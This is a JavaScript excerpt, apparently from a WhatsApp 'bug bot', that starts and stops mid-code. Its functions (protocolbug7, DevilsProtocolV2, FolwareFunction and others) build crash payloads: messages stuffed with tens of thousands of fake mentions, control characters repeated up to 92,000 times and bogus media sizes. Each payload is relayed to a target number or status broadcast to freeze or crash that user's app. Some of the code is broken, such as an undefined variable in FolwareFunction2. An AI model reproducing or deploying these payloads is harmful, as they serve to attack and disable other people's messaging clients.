businessOwnerJid: jid
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "BLACK DZEEE",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFc + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFc + "\u0003",},
{ name: "single_select", buttonParamsJson: bokepFcV2 + "gatau",},
{ name: "call_permission_request", buttonParamsJson: bokepFcV2 + "\u0003",},
]
}
}
}
}
};

await sock.relayMessage(jid, messagePayload, { participant: { jid: jid } });
await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
//####################################################################
async function protocolbug7(sock, jid, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, messageContent, { userJid: jid });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: jid }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
//####################################################################
async function protocolbug8(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}  
//####################################################################      
async function DevilsProtocolV2(sock, jid, mention) {
    const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Devils Protocols" + "᭄".repeat(10000),
        title: "Version 2" + "᭄",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/UnDeath.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const devilsMesagge = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `🥶`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: "https://t.me/FunctionLihX"
        },
           businessMessageForwardInfo: {
              businessOwnerJid: jid,
        },
            isSampled: true,
            mentionedJid: mentionjid
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363406229895095@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                   embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: { devilsMesagge }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: jid }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//####################################################################
async function FolwareFunction(sock, jid, folware) {
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg = generateWAMessageFromContent(jid, MSG, MassageFolware, {});

  await folware.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await folware.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
//####################################################################
async function FolwareFunction2(sock, jid, folware) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u0003",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    
    const msg1 = generateWAMessageFromContent(jid, generateMessage, {});
    
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg2 = generateWAMessageFromContent(jid, MassageFolware, {});

  await folware.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await folware.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
//####################################################################
async function TagMsgPayment(sock, jid) {
    try {
        const quotedMessage = {
            extendedTextMessage: {
                text: "᭯".repeat(12000),
                matchedText: "https://" + "ꦾ".repeat(500) + ".com",
                canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
                description: "\u0000".repeat(500),
                title: "\u200D".repeat(1000),
                previewType: "NONE",
                jpegThumbnail: Buffer.alloc(10000), 
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: false,
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "Lucukausmp?",
                        body: "\u0000".repeat(10000),
                        thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
                    },
                    mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
                }
            },
            paymentInviteMessage: {
                currencyCodeIso4217: "USD",
                amount1000: "999999999",
                expiryTimestamp: "9999999999",
                inviteMessage: "Payment Invite" + "💦".repeat(1770),
                serviceType: 1
            }
        };

        let messageObject = await generateWAMessageFromContent(jid, {
            viewOnceMessage: {
                message: {
                    extendedTextMessage: {
                        text: "𝖬𝖺𝗄𝗅𝗈 𝖣𝗂 𝖤𝗇𝗍𝗈𝖽 𝖬𝖺𝗋𝗄",
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => 
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                            isSampled: true,
                            participant: jid,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: false,
                            quotedMessage: quotedMessage
                        }
                    }
                }
            }
        }, {});

        await new Promise(resolve => setTimeout(resolve, 1000));

        await sock.relayMessage("status@broadcast", messageObject.message, {
            messageId: messageObject.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {}, 
                    content: [{
                        tag: "to", 
                        attrs: { jid: jid },
                        content: undefined,
                    }],
                }],
            }],
        });

    } catch (err) {
        console.error('Error Bocah:', err);
    }
}
//####################################################################
async function stunnerBugMP4(sock, jid) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            interactiveAnnotations: [],
            annotations: [
              {
                embeddedContent: {
                  musicContentMediaId: "12345789451",
                  songId: "88888888888888",
                  author: "No One Care!",
                  title: "No One Care!",
                  artworkDirectPath:
                    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256:
                    "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                  artistAttribution: "https://www.instagram.com/_u/noonecare",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey:
                    "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                },
                embeddedAction: true,
              },
            ],
            caption: `< PRIMROSE LOTUS >`,
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "bvkPnStTimcqgvugKm2jV1cKSAdJ00DnnKR31N/aH0Q=",
            fileLength: {
              low: 55438054,
              high: 0,
              unsigned: true,
            },
            seconds: 312,
            mediaKey: "XSc3T7jk+OhrNGSH4gMZQFnzL7boede9orqrG4a+QZ0=",
            height: 864,
            width: 480,
            fileEncSha256: "krpFGEDnkho/kNIQRY6qCYfzxdaxNzdW2H5fli3qg64=",
            directPath:
              "/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0",
            mediaKeyTimestamp: {
              low: 1745804782,
              high: 0,
              unsigned: false,
            },
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 42000,
                  },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
            },
            streamingSidecar:
